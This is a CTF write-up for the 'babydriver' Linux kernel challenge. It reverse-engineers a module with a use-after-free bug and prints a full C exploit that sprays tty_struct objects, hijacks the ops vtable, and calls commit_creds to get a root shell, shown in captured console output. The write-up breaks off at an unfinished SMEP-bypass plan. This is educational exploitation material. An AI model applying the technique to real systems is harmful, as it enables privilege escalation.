# babydriver (kernel, uaf, tty_struct, smep, -smap, -kaslr)
This was my third kernel challenge and first in which I had to exploit use after free vulnerability. I will not explain here what bzImage/*.cpio files are as I've did this in [previous](https://github.com/kscieslinski/CTF/tree/master/pwn/hacklu2019/BabyKernel2) kernel writeup.

## Enumeration
### Looking inside
I've started with unpacking provided files and looking inside rootfs.cpio:

```console
$ tar -xf babydriver_0D09567FACCD2E891578AA83ED3BABA7.tar
$ ls
boot.sh  bzImage  rootfs.cpio
$ mkdir extracted
$ cd extracted
$ zcat ../rootfs.cpio | cpio -idvm .
.
etc
etc/init.d
etc/passwd
etc/group
bin
bin/su
bin/grep
bin/watch
[...]
$ ls lib/modules/4.4.72/
babydriver.ko
```

So as usuall, we are given kernel compressed image (bzImage) along with filesystem (rootfs.cpio) in which we can find kernel module binary (babydriver.ko).

Unfortunately we are not given vmlinux nor System.map. Both would be really helpful when debugging.

### RE
Having kernel module binary I've opened it under Ghidra. The reverse engineering part was super easy.

```c

struct babydev_t {
    char *device_buf;
    size_t device_buf_len;
};

struct babydev_t babydev_struct;


int babyopen(void *inode,void *filep)
{
  babydev_struct.device_buf = (char *)kmalloc(0x40, GFP_KERNEL);
  babydev_struct.device_buf_len = 0x40;
  printk("device open\n");
  return 0;
}

int babyrelease(void *inode,void *filep)
{
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}

ssize_t babyread(struct file *filep, char *__user buff, size_t count, loff_t *offp)
{
    if (babydev_struct.device_buf && babydev_struct.device_buf_len >= count)
    {
        copy_to_user(buf, babydev_struct.device_buf, count);
    }

    return 0;
}

ssize_t babywrite(struct file *filep, char *__user buff, size_t count, loff_t *offp)
{
    if (babydev_struct.device_buf && babydev_struct.device_buf_len >= count)
    {
        copy_from_user(babydev_struct.device_buf, buf, count);
    }

    return 0;
}

long babyioctl(struct file *filep, unsigned int cmd, unsigned long arg)
{
    if (cmd == 0x10001)
    {
        kfree(babydev_struct.device_buf);
        babydev_struct.device_buf = (char *)kmalloc(arg, GFP_KERNEL);
        babydev_struct.device_buf_len = arg;
        printk(KERN_INFO "alloc done\n");
        return 0;
    }
    else
    {
        printk(KERN_INFO "default arg is %lx\n", 0x10001);
        return -EINVAL;
    }
}
```

There is one global variable: `babydev_struct`. When opening a device we allocate a buffer of size 0x40 and when closing we free this buffer. Moreover we can write to and read from a buffer and resize it.


### UAF
Of course this is very bad and vulnerable example of code. One should use a `private_data` field of `struct file` for allocating custom per open data.

Why above code is vulnerable? Well, imagine we open `/dev/babydev` twice and then close it once:

```c
int fd1 = open("/dev/babydev", O_RDWR, 0);
int fd2 = open("/dev/babydev", O_RDWR, 0);
close(fd1);
```

 On first call to open a buffer (let's name it buffer1) of size 0x40 gets allocated and we get a handle fd1. On second call to open we allocate new buffer (name it buffer2), get handle fd2 and we just loose track of the previous one. As c has no garbage collector this leads to memory leaks but it is not vulnerable itself. But then we call close(fd1) and we free the buffer2. The memory chunk gets placed back to kmalloc_cache but we still can access it via fd2. This is standard example of use-after-free vulnerability.

## Exploit
As I had no experience with exploiting use-after-free I used [lexfo](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html) tutorial a lot.ne I really recommend it to anyone who want's to start with kernel exploitation. Moreover I saw some writeups later on and it seems that there is another way to repair the stack with `swapgs` gadget.

### Gaining control over RIP via tty_struct
Above in UAF section I've presented a situation where a freed memory chunk gets placed back in kmalloc_cache but we can still write and read on it. To gain control over execution flow we have to force kernel allocator (SLUB) to allocate some object we have control over on the chunk we freed. There are standard techniques for this. One of them is using `tty_struct` object of size 0x2e0 for this (0x2e0 will land in bucket: 2^10).

```c
int fd1 = open("/dev/babydev", O_RDWR, 0);
int fd2 = open("/dev/babydev", O_RDWR, 0);

ioctl(fd1, 0x10001, 0x2e0); // resize, so chunk get placed in right bucket

close(fd1);

int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0); // alocates tty_struct of size 0x2e0


```

If you are having troubles imagine how it looks like, I've created a diagram to help you. 
This is how a situation looks like after executing `int fd1 = open("/dev/babydev", O_RDWR, 0);`. 

![](img/diagram1.png)

As you can see, the buffer1 of size 0x40 got allocated and we can write/read from it using fd1 descriptor.

Then we open /dev/babydev again: `int fd2 = open("/dev/babydev", O_RDWR, 0);`

![](img/diagram2.png)

And same as before, a new buffer2 gets allocated. We loose track of buffer1, but it doesn't get returned to SLUB allocator as it wasn't directly freed. The super important part here is that we can write/read from the buffer using both fd1 and fd2!!!

Then we just call resize with `ioctl` operation: `ioctl(fd1, 0x10001, 0x2e0);`:

![](img/diagram3.png)

so that when freed, the memory chunk the buffer3 occupies will be placed back to bucket 2^11.

Now we close fd1 with `close(fd1);`:

![](img/diagram4.png)

The buffer3 gets freed and returned to SLUB allocator. SLUB allocator will then place it inside kmalloc_cache_cpu or inside one of slabs inside kmem_cache_node (in first situation our exploit has more chance to succeed). At the same time we cannot write/read from buffer using fd1 anymore, but we can write/read from buffer using fd2!!!

Now we allocate a struct tty_struct of size 0x2e0 by opening /dev/ptmx: `int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);`. You can read more about it [here](https://linux.die.net/man/4/ptmx):

![](img/diagram5.png)

As you can see, tty_struct got filled with some data. The interesting field for us is `const struct tty_operations*` which is a pointer to virtual function table. Anytime user invokes a function such as `ioctl`, a kernel will use this pointer to find vtable and then will invoke an `ioctl` function from it:

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    [...]
	int  (*ioctl)(struct tty_struct *tty,
    [...]
};

struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
    [...]
};
```

But remember, we still can access buffer3 and so we can overwrite tty_struct. We will overwrite tty_struct.ops field to point to fake vtable which we will create before. Our payload:

```c
#define TTY_HDR_SIZE 0x20

int fd1 = open("/dev/babydev", O_RDWR, 0);
int fd2 = open("/dev/babydev", O_RDWR, 0);

ioctl(fd1, 0x10001, 0x2e0); // resize, so chunk get placed in right bucket

close(fd1);

int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0); // alocates tty_struct of size 0x2e0

struct tty_operations fake_tty_operations;
memset(fake_tty_operations, 0x41, sizeof(struct tty_operations));

char fake_tty_header[TTY_HDR_SIZE];
read(fd2, fake_tty_header, sizeof(fake_tty_header); // read first not to overwrite any other values
/* Overwrite tty_operations field of struct tty pointer to point to fake_tty_operations vtable. */
*((uint64_t *)fake_tty_header + 3) = (uint64_t)fake_tty_operations;
write(fd2, fake_tty_header, sizeof(fake_tty_header);

/* triger arbitrary call */
ioctl(tty_fd, 0, 0);
```

After write and before ioctl our memory layout looks like:

![](img/diagram6.png)

and so when calling `ioctl(tty_fd, 0, 0)` a function under 12 index in fake_tty_operations will get called. In this case it would cause kernel panic as smep is enabled and perhaps memory under 0x4141414141414141 is not mapped.

### Small win
If there where no smep protection enabled, we could get a shell at this point. Just instead of invoking 0x4141414141414141, we would call userland function which would increase current process privilages and then open shell. This is yet another very popular technique:

`commit_creds(prepare_kernel_cred(NULL));`

copies kernel (ring 0) credentials to current process. But before let's increase our exploit reliability. At this moment the chance that SLUB allocates same memory chunk we freed for tty_struct is high only because we are working on virtual machine where not much is going on. In reallity we would have much bigger problems. To increase our chances we can both prevent the scheduler from moving us to different cpu and to perform heap-spray technique. The latter just instead of allocating one tty_struct and hoping we will have luck allocates many tty_structs (we still do not have 100% it would work, but for sure our chances will increase).

Our first exploit assuming there is no smep will look like:

```c
/**
 * Compile with: gcc exploit.c -o exploit -O0 -std=c99 -Wall --static
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/*****************************************************************************
 ** FUNCTION HEADERS
 *****************************************************************************/
int migrate_to_cpu0(void);
int init(int *fd, int *fd2);
int set_buf_size(int fd, size_t sz);
int triger_uaf(int fd, int fd2);
int escalate(int fd);
int alloc_fake_structures(void);
typedef int (*commit_creds_func)(void *new);
typedef void *(*prepare_kernel_creds_func)(void *daemon);

/*****************************************************************************
 ** OTHER CONSTANTS
 *****************************************************************************/
#define HEAP_SPRAY_POWER 100
#define PAGE_SIZE 4096

#define _getpid() syscall(__NR_getpid)
#define _sched_setaffinity(pid, cpusetsize, mask) \
    syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)
#define _mmap(addr, length, prot, flags, fd, offset) \
    syscall(__NR_mmap, addr, length, prot, flags, fd, offset)

/*****************************************************************************
 ** TARGET_SPECIFIC_CONSTANTS\MACROS
 *****************************************************************************/
#define SET_BUF_SIZE_CMD 0x10001
#define REALLOCATION_SIZE 0x2e0

#define TTY_OPERATIONS_SIZE 0xf0
#define IOCTL_STRUCT_TTY_OPERATIONS_OFST 0x18
#define MAGIC_STRUCT_TTY_OPERATIONS_OFST 0x0
#define TTY_MAGIC 0x5401
#define TTY_HDR_SIZE 0x20

#define COMMIT_CREDS ((void *)0xffffffff810a1420)
#define PREPARE_KERNEL_CRED ((void *)0xffffffff810a1810)

#define commit_creds(cred) \
    (((commit_creds_func)(COMMIT_CREDS))(cred))

#define prepare_kernel_cred(daemon) \
    (((prepare_kernel_creds_func)(PREPARE_KERNEL_CRED))(daemon))

/*****************************************************************************
 ** GLOBALS
 *****************************************************************************/
int g_tty_fds[HEAP_SPRAY_POWER];
char *g_fake_tty_operations;

static void payload(void)
{
    commit_creds(prepare_kernel_cred(NULL));
}

int migrate_to_cpu0(void)
{
    int err;
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);

    err = _sched_setaffinity(_getpid(), sizeof(set), &set);
    if (err == -1)
    {
        perror("[-] Failed to migrate to cpu0");
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int set_buf_size(int fd, size_t sz)
{
    int err;

    err = ioctl(fd, SET_BUF_SIZE_CMD, sz);
    if (err < 0)
    {
        perror("[-] Failed to set buf size");
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int alloc_fake_structures(void)
{
    g_fake_tty_operations = malloc(TTY_OPERATIONS_SIZE);
    *((uint64_t *)g_fake_tty_operations + 12) = (uint64_t)payload;

    return 0;
}

/**
 * Open and resize the device_buffer twice.
 */
int init(int *fd, int *fd2)
{
    if (migrate_to_cpu0() < 0)
        goto fail;

    if (alloc_fake_structures() < 0)
        goto fail;

    *fd = open("/dev/babydev", O_RDWR, 0);
    if (*fd < 0)
    {
        perror("[-] Failed to open /dev/babydev");
        goto fail;
    }

    *fd2 = open("/dev/babydev", O_RDWR, 0);
    if (*fd2 < 0)
    {
        perror("[-] Failed to open /dev/babydev");
        goto fail;
    }

    if (set_buf_size(*fd, REALLOCATION_SIZE) < 0)
        goto fail;
    if (set_buf_size(*fd2, REALLOCATION_SIZE) < 0)
        goto fail;

    return 0;
fail:
    return -1;
}

/**
 * Free fd2 and allocate reallocation gadgets to create use-after-free.
 */
int triger_uaf(int fd, int fd2)
{
    int magic;

    /* Free slub object. Note that we still control it from fd. */
    close(fd2);

    /* Heap spray. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
    {
        g_tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);
        if (g_tty_fds[i] < 0)
        {
            perror("Failed to open /dev/ptmx");
            goto fail;
        }
    }

    /* Check if we successfully gained use-after-free. */
    if (read(fd, &magic, sizeof(magic)) != sizeof(magic))
    {
        perror("read failed:");
        goto fail;
    }

    if (magic != TTY_MAGIC)
    {
        fprintf(stderr, "[-] Magic number mismatch, expected: %x, got: %x", TTY_MAGIC, magic);
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int escalate(int fd)
{
    char fake_tty_header[TTY_HDR_SIZE];

    /* Overwrite tty_operations field of struct tty pointer to point to fake_tty_operations vtable. */
    if (read(fd, fake_tty_header, sizeof(fake_tty_header)) != sizeof(fake_tty_header))
    {
        perror("read struct tty header failed");
        goto fail;
    }
    *((uint64_t *)fake_tty_header + 3) = (uint64_t)g_fake_tty_operations;

    if (write(fd, fake_tty_header, sizeof(fake_tty_header)) != sizeof(fake_tty_header))
    {
        perror("[-] Failed to overwrite struct tty\n");
        goto fail;
    }

    /* Triger stack pivot. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
        ioctl(g_tty_fds[i], 0, 0);

    return 0;
fail:
    return -1;
}

int main()
{
    int fd, fd2;

    if (init(&fd, &fd2) < 0)
    {
        fprintf(stderr, "[-] Failed to initialize data.\n");
        goto fail;
    }
    printf("[+] Initialization succeed.\n");

    if (triger_uaf(fd, fd2) < 0)
    {
        fprintf(stderr, "[-] Failed to triger use-after-free vulnerability.\n");
        goto fail;
    }
    printf("[+] Triggered use-after-free.\n");

    if (escalate(fd) < 0)
    {
        fprintf(stderr, "[-] Failed to escalate\n");
        goto fail;
    }
    printf("[+] Escalation phase succeed.\n");

    printf("[i] Poping shell...");
    system("/bin/sh");

    return 0;

fail:
    return -1;
}
```

We can test it out. Remember to remove +smep from boot.sh!

```console
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./exploit
[    4.651448] device open
[    4.653243] device open
[    4.653810] alloc done
[    4.654281] alloc done
[+] Initialization succeed.
[    4.655208] device release
[+] Triggered use-after-free.
[+] Escalation phase succeed.
/ # id
uid=0(root) gid=0(root)
/ #
```

### Protections
You migh wonder how did I knew smep is enabled. To check software and hardware protections I've checked `boot.sh` file:

```bash
#!/bin/bash

stty intr ^]
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
```

Note: I've added `stty intr ^]` so that I can eassly kill qemu on kernel panic.

So from reading `boot.sh` we can determinate that there is a hardware protection `smep` (Supervisor mode execution protection), but fortunetely there is no `kaslr` (kernel address space layout randomization) turn on.

This means that we will have to bypass `smep` before invoking userland code as smep does not allow kernel to execute code from userland.

### Plan
As we cannot directly execute userland code, we have to use ROP instead. We will:

  [x] trigger use-after-free with tty_struct
  [x] create fake tty_operations and overwrite tty_struct->ops field so it points to it
  [ ] allocate fake stack and then overwrite fake tty_operations.ioctl field with a gadget which will pivot the kernel stack
  [ ] save rsp/rbp registers to restore them after ROP
  [ ] disable smep
  [ ] jump to userland function which will restore the saved rsp & rbp and call `commit_creds(prepare_kernel_cred(NULL));`
  [ ] pop shell with system("/bin/sh")

### Looking for gadgets


## References:
- https://blog.csdn.net/lukuen/article/details/6935068